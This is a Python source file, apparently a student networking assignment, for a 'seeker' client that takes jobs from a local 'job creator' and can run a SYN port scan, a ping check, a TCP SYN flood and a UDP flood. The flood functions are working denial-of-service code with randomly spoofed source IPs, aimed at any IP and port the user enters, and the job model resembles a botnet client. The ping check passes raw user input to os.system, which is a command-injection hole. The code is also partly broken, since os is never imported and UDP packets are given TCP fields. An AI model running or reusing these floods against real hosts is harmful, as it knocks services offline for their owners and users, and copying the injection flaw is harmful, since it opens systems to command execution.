import logging
from socket import *
from scapy.layers.inet import IP, TCP, sr1, sr, UDP
from scapy.volatile import RandShort
from scapy.all import send
import json, sys, random
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

class seeker:
    creatorName = '127.0.0.1'

    def __init__(self, port):
        self.creatorPort = int(port)
        self.start()
    
    #   Connected to the job creator
    def start(self):
        try:
            self.seekerSocket = socket(AF_INET, SOCK_STREAM)
            self.seekerSocket.connect((self.creatorName,self.creatorPort))

            print('Connected to creator ' + str(self.creatorName) + ' at port ' + str(self.creatorPort) + '\n')

            #   Send services
            self.seekerSocket.send(self.encode(messageType=1, services=input('Enter services: ')))
            print('Services message sent to job-creator\n')

            #   Recieve job
            self.decode(self.seekerSocket.recv(1024).decode())
            print('Job message received from job-creator\n')

            #   Send accept
            accept = input('Enter 1 for accept, 0 for reject: ')
            self.seekerSocket.send(self.encode(messageType=2, accept=accept))
            print('Accept message sent to job-creator\n')
            if accept == '1':
                self.status = self.job_switch(self.job_code)
            elif accept == '0':
                self.seekerSocket.close()
                sys.exit()
            else:
                print('incorrect input')
                self.seekerSocket.close()

            #   Recieve acknowledge
            self.decode(self.seekerSocket.recv(1024).decode())
            print('Acknowledge message received from job-creator\n')

            #   Send completed
            if self.status:
                self.result = 'Completed'
            else:
                self.result = 'Failed'

            self.seekerSocket.send(self.encode(messageType=3, job=self.job_code, status=self.status, result=self.result))
            print('Completed message sent to job-creator')
        except:
            print('***Connection to creator failed***')

    #   Encode the message format
    #   messageType -The type of message being sent
    #   services    -The seekers services available
    #   accept      -Boolean for accepting or declining a job
    #   job         -The job
    #   status      -The status of the job
    #   result      -The result of the job
    #   Returns the message as bytes
    def encode(self, messageType, services='', accept=True, job='', status='', result=''):
        message = {}    #!Temp dictionary

        #   Switch case for different message types
        if messageType == 1:
            #   Services message
            message =   {'header':messageType,
                        'services':services}
        elif messageType == 2:
            #   Accept message
            message =   {'header':messageType,
                        'Accept':accept}
        else:
            #   Completion message
            message =  {'header':messageType,
                        'job':job,
                        'status':status,
                        'result':result}

        messageEncoded = json.dumps(message).encode()
        return messageEncoded

    #   Decode the message from the creator
    #   message -The message from the creator
    def decode(self, message):
        messageDecoded = json.loads(message)
        for key in messageDecoded:
            if key == 'job':
                self.job_code = messageDecoded.get(key)
            print(key + ' : ' + str(messageDecoded.get(key)))

    #   Assignment 3, job switch
    def job_switch(self, job_code):
        try:
            if job_code == '1':
                print('Job: Scan Port')
                self.scanPort()
            elif job_code == '2':
                print('Job: Check Host')
                self.checkHost(input('Enter host: '))
            elif job_code == '3':
                print('Job: TCP Flood')
                self.SYN_TCP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
            elif job_code == '4':
                print('Job: UDP Flood')
                self.SYN_UDP_Flood(input('Enter destination IP: '),input('Enter destination port: '),input('Enter counter: '))
            else:
                print('invalid input: ' + str(job_code))
            return 1
        except:
            return 0

    #   Assignment 3, Part 2, one-to-one part 2
    def scanPort(self, dst_ip='127.0.0.1', src_port=RandShort(), port = 26):
        print()
        tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='S'),timeout=10)

        if str(type(tcp_connect_scan_resp)) == "<type 'NoneType'>":
            print("Filtered")
        elif(tcp_connect_scan_resp.haslayer(TCP)):
            if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
                send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=port,flags='AR'),timeout=10)
                print(port, 'Open')
            elif(tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
                print('Closed')
        print()

    #   Assignment 3, Part 2, one-to-one part 1
    def checkHost(self, host):
        HOST_UP  = True if os.system("ping " + host) == 0 else False

    #   Assignment 3, Part 2, one-to-many part 2
    def SYN_TCP_Flood(self, dstIP, dstPort, counter):
        total = 0
        print("Packets are sending ...")
        for x in range(0,int(counter)):
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = dstIP

            #   Created our own TCP packet
            TCP_Packet = TCP()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(dstPort)
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
            total+=1
        print("\nTotal packets sent: %i\n" % total)
        print()

    #   Assignment 3, Part 2, one-to-many part 3
    def SYN_UDP_Flood(self, dstIP, dstPort, counter):
        total = 0
        print("Packets are sending ...")
        for x in range (0, int(counter)):
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
            IP_Packet.dst = dstIP

            #   Created our own TCP packet
            UDP_Packet = UDP()	
            UDP_Packet.sport = s_port
            UDP_Packet.dport = int(dstPort)
            UDP_Packet.flags = "S"
            UDP_Packet.seq = s_eq
            UDP_Packet.window = w_indow

            send(IP_Packet/UDP_Packet, verbose=0)
            total+=1
        print("\nTotal packets sent: %i\n" % total)
        print()

if __name__ == "__main__":
    seeker(input('Enter port #: '))